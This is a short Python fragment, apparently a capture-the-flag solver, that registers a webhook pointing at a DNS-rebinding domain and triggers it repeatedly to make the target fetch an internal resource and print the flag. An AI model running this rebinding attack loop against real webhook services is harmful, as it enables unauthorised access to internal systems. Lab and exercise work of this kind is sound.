for _ in range(20):
    r = requests.post(f"{TARGET}/register", data={"url": REBIND_DOMAIN})
    if "registered" in r.text:
        webhook_id = r.json()["id"]
        print(f"[+] Registered: {webhook_id}")
        
        # Trigger repeatedly
        for i in range(100):
            r = requests.post(f"{TARGET}/trigger", data={"id": webhook_id})
            if "response" in r.text and "error" not in r.text:
                print(f"[!] FLAG: {r.json().get('response')}")
                exit()
            time.sleep(0.1)